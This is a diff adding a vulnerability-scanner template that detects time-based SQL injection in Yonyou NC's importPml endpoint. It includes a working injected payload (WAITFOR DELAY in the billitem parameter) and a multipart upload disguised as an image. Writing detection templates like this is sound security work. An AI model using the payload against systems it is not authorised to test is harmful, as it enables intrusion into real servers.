@@ -1,0 +1,55 @@
+id: poc-yaml-yongyou-nc-importpml-sqli
+info:
+  name: Yonyou NC importPml SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in Yonyou NC's importPml endpoint using time-based payloads.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<TITLE>Yonyou NC</TITLE>"
+        part: body
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
+
+        ------WebKitFormBoundaryH970hbttBhoCyj9V
+        Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+        Content-Type: image/jpeg
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true" skin="webclassic" level="0"  linkgroup="0000z010000000000002" ordernum="15">
+        </page>
+        ------WebKitFormBoundaryH970hbttBhoCyj9V--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Yonyou NC"
+        part: body
+      - type: dsl
+        dsl:
+          - "!(contains(body, '<'))"
+          - "duration > t1"
+          - "duration < t2"
